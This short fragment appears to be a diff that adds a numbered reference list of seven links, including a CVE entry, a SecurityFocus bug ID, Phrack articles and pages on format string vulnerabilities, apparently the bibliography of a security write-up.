+
+[0] http://msdn.microsoft.com/en-us/library/ms175782.aspx
+[1] http://www.securityfocus.com/bid/1634
+[2] http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0393
+[3] http://www.phrack.org/issues.html?issue=59&id=7&mode=txt
+[4] http://www.phrack.org/issues.html?issue=63&id=14
+[5] http://althing.cs.dartmouth.edu/local/formats-teso.html
+[6] http://www.loko.nu/formatstring/format_string.htm
